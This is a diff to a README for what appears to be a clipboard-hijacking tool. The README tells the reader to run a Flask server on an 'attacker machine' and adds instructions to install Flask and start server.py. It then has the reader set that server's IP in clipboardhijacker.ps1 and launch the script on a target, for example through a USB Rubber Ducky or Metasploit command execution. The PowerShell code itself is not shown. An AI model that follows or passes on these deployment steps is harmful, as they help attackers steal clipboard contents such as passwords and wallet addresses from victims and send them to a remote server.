@@ -19,9 +19,13 @@ The script also logs clipboard data locally on the machine for redundancy.
 ### Error Handling: 
 The script catches and logs any errors that occur while trying to send data to the web server.
 ## How to use:
-Run Flask webserver your attacker machine using python.
+Run Flask webserver your attacker machine using python so you need to install flask.
 ```
-python server.py
+python3 -m pip install flask
+```
+Now you can run the following command for run the server
+```
+python3 server.py
 ```
 change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.
 ```
